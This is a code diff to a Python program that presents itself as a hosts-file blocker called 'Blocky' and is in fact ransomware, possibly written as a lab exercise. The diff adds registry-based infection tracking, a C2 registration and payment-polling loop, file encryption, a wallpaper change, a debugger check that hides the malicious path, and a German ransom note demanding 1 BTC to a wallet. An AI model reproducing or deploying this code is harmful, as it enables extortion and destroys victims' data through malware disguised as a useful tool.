@@ -11,6 +11,7 @@ import pathlib  # Handling file paths
 import base64  # Handling base64 en/decoding
 import os, sys  # Handling system related tasks (hostname/usernames)
 import ctypes  # Calling Windows APIs
+import winreg  # Editing Windows Registry
 import threading  # Enabling Thread creation
 import datetime  # Handling time-related data
 from random import randint  # Random ints for 😴
@@ -23,6 +24,16 @@ c2_url = "http://localhost:5000"
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
 # ..except for the filetypes defined in the following list
 exclude_types = (".exe", ".dll", ".img")
+
+
+class BadThread(object):
+    def __init__(self):
+        thread = threading.Thread(target=self.run, args=())
+        thread.daemon = True
+        thread.start()
+
+    def run(self):
+        fake_main()
 
 
 class FakeBlocker:
@@ -51,7 +62,7 @@ class FakeBlocker:
         """Checks if the tool has been run with Admin privileges. Otherwise print error"""
         try:
             if ctypes.windll.shell32.IsUserAnAdmin():
-                return
+                return True
             else:
                 print(
                     "Blocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!"
@@ -60,6 +71,23 @@ class FakeBlocker:
         except Exception as err:
             print(f"is_admin(): Error --> {err}")
             return False
+
+    def initial_check(self):
+        """Checks for existing Registry entries -> Maybe the tool has been here before?"""
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+            rnsm = Ransomware(resume=True)
+            rnsm.victim_id = winreg.QueryValueEx(key, "ID")[0]
+            print(
+                "\n Du bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\n Starte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt."
+            )
+            rnsm.sync_loop()
+        except:
+            BadThread()
+            blocky.show_menu()
 
     def show_menu(self):
         """Prints the Blocky menu and takes user input on menu selection"""
@@ -98,15 +126,12 @@ class FakeBlocker:
 class Ransomware:
     """This object implements the core function and variables for the Ransomware"""
 
-    def __init__(self):
-        # Get Public IP as one of the identification indicators
-        self.public_ip = self.get_public_ip()
-
-        # Get current date to estimate when contact was established
-        self.firstContact = datetime.datetime.now()
-
-        # Get hostname/username as another identification indicator
-        self.hostname, self.username = self.get_system_info()
+    def __init__(self, resume=False):
+        # Get system info, if system has not been infected yet
+        if not resume:
+            self.public_ip = self.get_public_ip()
+            self.firstContact = datetime.datetime.now()
+            self.hostname, self.username = self.get_system_info()
 
         # Data which will be received by C2 server later on
         self.encryption_key = None
@@ -143,14 +168,6 @@ class Ransomware:
             print("get_system_info(): OS Error --> ", err)
             return "generic_hostname", "generic_username"
 
-    def check_for_infection(self):
-        # TODO: Think of a way to leave a trace and to check for infections
-        # If this variable is set, then we have been on this system before
-        if os.getenv("RNSMID") is not None:
-            return True
-        else:
-            return False
-
     def create_remote_entry(self):
         """Creates a DB entry for the new victim on the C2 server and receives encryption key & ID"""
         payload = {
@@ -173,6 +190,17 @@ class Ransomware:
         self.victim_id = response.headers["victim-id"]
         bin_key = base64.b64decode(self.encryption_key)
         self.box = nacl.secret.SecretBox(bin_key)
+
+    def create_registry_entry(self):
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+        except:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
+        winreg.SetValueEx(key, "ID", 0, winreg.REG_SZ, str(self.victim_id))
+        winreg.CloseKey(key)
 
     def encrypt_file(self, filepath):
         """Takes a file path input and encrypts it using the box object of the Ransomware object"""
@@ -283,34 +311,18 @@ class Ransomware:
         bin_key = base64.b64decode(self.encryption_key)
         self.box = nacl.secret.SecretBox(bin_key)
 
+    def sync_loop(self):
+        # print("💲💲💲 Starting loop to check for payment receival...")
+        while (
+            httpx.post(f"{c2_url}/check/{self.victim_id}").headers["Payment-Received"]
+            == "False"
+        ):
+            sleep(5)
+            # print("😴 Syncing...")
 
-def fake_main():
-    """Main function responsible for rnsm fucntionality"""
-    if ctypes.windll.kernel32.IsDebuggerPresent():
-        return
-    rnsm = Ransomware()
-    rnsm.create_remote_entry()
-    rnsm.start_encryption()
-    rnsm.change_wallpaper()
-    # print("💲💲💲 Starting loop to check for payment receival...")
-    while (
-        httpx.post(f"{c2_url}/check/{rnsm.victim_id}").headers["Payment-Received"]
-        == "False"
-    ):
-        sleep(randint(10, 120))
-        # print("😴 Syncing...")
-    # print("✔✔✔ Payment was received!")
-    rnsm.setup_decryption()
-    rnsm.start_decryption()
-    rnsm.change_wallpaper(defaultWallpaper=True)
-    # print("🍾🍾🍾 You are all done, all files are now decrypted!")
-
-
-def main():
-    """Main function responsible for Blocky functionality"""
-    blocky = FakeBlocker()
-    blocky.is_admin()
-    blocky.show_menu()
+        self.setup_decryption()
+        self.start_decryption()
+        self.change_wallpaper(defaultWallpaper=True)
 
 
 class Threading(object):
@@ -323,7 +335,29 @@ class Threading(object):
         fake_main()
 
 
+def fake_main():
+    """Main function responsible for rnsm functionality"""
+    rnsm = Ransomware()
+    rnsm.create_remote_entry()
+    rnsm.create_registry_entry()
+    rnsm.start_encryption()
+    rnsm.change_wallpaper()
+    rnsm.sync_loop()
+
+
+def main():
+    """Main function responsible for Blocky functionality"""
+    blocky.show_menu()
+
+
 if __name__ == "__main__":
-    Threading()
-    main()
+    blocky = FakeBlocker()
+    # Exit the programm, should it be run as non-Admin
+    if not blocky.is_admin():
+        sys.exit()
+    # Directly jump into the fake functionality, should a debugger be detected, so no malicious activity is run
+    if ctypes.windll.kernel32.IsDebuggerPresent():
+        main()
+    # Start check if system is already infected or not
+    blocky.initial_check()
 
